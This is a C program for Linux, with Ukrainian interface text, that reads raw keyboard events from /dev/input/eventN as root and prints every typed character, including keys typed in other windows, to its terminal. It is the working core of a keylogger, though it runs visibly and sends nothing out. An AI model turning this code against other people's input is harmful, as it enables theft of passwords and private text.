#define _GNU_SOURCE
#include <fcntl.h>
#include <linux/input.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static char base[KEY_CNT];
static char shft[KEY_CNT];

static void init_keymap(void) {
    const int  lk[] = {KEY_A,KEY_B,KEY_C,KEY_D,KEY_E,KEY_F,KEY_G,KEY_H,KEY_I,
                       KEY_J,KEY_K,KEY_L,KEY_M,KEY_N,KEY_O,KEY_P,KEY_Q,KEY_R,
                       KEY_S,KEY_T,KEY_U,KEY_V,KEY_W,KEY_X,KEY_Y,KEY_Z};
    const char *lo = "abcdefghijklmnopqrstuvwxyz";
    const char *up = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    for (int i = 0; i < 26; ++i) { base[lk[i]] = lo[i]; shft[lk[i]] = up[i]; }

    const int  dk[] = {KEY_1,KEY_2,KEY_3,KEY_4,KEY_5,
                       KEY_6,KEY_7,KEY_8,KEY_9,KEY_0};
    const char *dn = "1234567890";
    const char *ds = "!@#$%^&*()";
    for (int i = 0; i < 10; ++i) { base[dk[i]] = dn[i]; shft[dk[i]] = ds[i]; }

    base[KEY_SPACE]=' ';      shft[KEY_SPACE]=' ';
    base[KEY_MINUS]='-';      shft[KEY_MINUS]='_';
    base[KEY_EQUAL]='=';      shft[KEY_EQUAL]='+';
    base[KEY_LEFTBRACE]='[';  shft[KEY_LEFTBRACE]='{';
    base[KEY_RIGHTBRACE]=']'; shft[KEY_RIGHTBRACE]='}';
    base[KEY_SEMICOLON]=';';  shft[KEY_SEMICOLON]=':';
    base[KEY_APOSTROPHE]='\'';shft[KEY_APOSTROPHE]='"';
    base[KEY_GRAVE]='`';      shft[KEY_GRAVE]='~';
    base[KEY_BACKSLASH]='\\'; shft[KEY_BACKSLASH]='|';
    base[KEY_COMMA]=',';      shft[KEY_COMMA]='<';
    base[KEY_DOT]='.';        shft[KEY_DOT]='>';
    base[KEY_SLASH]='/';      shft[KEY_SLASH]='?';
}

static int list_keyboards(void) {
    FILE *f = fopen("/proc/bus/input/devices", "r");
    if (!f) { perror("fopen(/proc/bus/input/devices)"); return 1; }

    char line[512], name[256] = "?";
    printf("Доступні клавіатури:\n");
    while (fgets(line, sizeof line, f)) {
        if (line[0] == 'N') {
            char *q = strchr(line, '"');
            if (q) { char *e = strrchr(line, '"');
                     if (e > q) { size_t l = (size_t)(e - q - 1);
                                  if (l >= sizeof name) l = sizeof name - 1;
                                  memcpy(name, q + 1, l); name[l] = 0; } }
        } else if (line[0] == 'H' && strstr(line, "kbd")) {
            char *ev = strstr(line, "event");
            if (ev) { int num = atoi(ev + 5);
                      printf("  /dev/input/event%-3d  %s\n", num, name); }
        }
    }
    fclose(f);
    printf("\nПерехоплення:  sudo %s /dev/input/eventN\n", "./keyhook");
    return 0;
}

int main(int argc, char **argv) {
    if (argc != 2) {
        fprintf(stderr, "Використання:\n"
                        "  %s --list                    список клавіатур\n"
                        "  sudo %s /dev/input/eventN     перехоплення вводу\n",
                argv[0], argv[0]);
        return 1;
    }
    if (strcmp(argv[1], "--list") == 0)
        return list_keyboards();

    int fd = open(argv[1], O_RDONLY);
    if (fd < 0) {
        perror("open(/dev/input/eventN)");
        fprintf(stderr, "Підказка: потрібен sudo (доступ до /dev/input/*).\n");
        return 1;
    }

    init_keymap();
    printf("=== Перехоплення клавіатури з %s ===\n", argv[1]);
    printf("Набирай у БУДЬ-ЯКОМУ іншому вікні — символи з'являться тут.\n");
    printf("Ctrl+C — завершити.\n\n");

    int shift = 0;
    struct input_event ev;
    while (read(fd, &ev, sizeof ev) == (ssize_t)sizeof ev) {
        if (ev.type != EV_KEY)
            continue;

        if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
            shift = (ev.value != 0);
            continue;
        }
        if (ev.value != 1 && ev.value != 2)
            continue;
        if (ev.code >= KEY_CNT)
            continue;

        char c = shift ? shft[ev.code] : base[ev.code];
        if (c) {
            putchar(c);
        } else {
            switch (ev.code) {
                case KEY_ENTER:
                case KEY_KPENTER:   printf("[Enter]\n"); break;
                case KEY_BACKSPACE: printf("[Backspace]"); break;
                case KEY_TAB:       printf("[Tab]"); break;
                case KEY_ESC:       printf("[Esc]"); break;
                case KEY_LEFTCTRL:
                case KEY_RIGHTCTRL: printf("[Ctrl]"); break;
                case KEY_LEFTALT:
                case KEY_RIGHTALT:  printf("[Alt]"); break;
                default:            printf("[code %u]", ev.code); break;
            }
        }
        fflush(stdout);
    }

    close(fd);
    return 0;
}
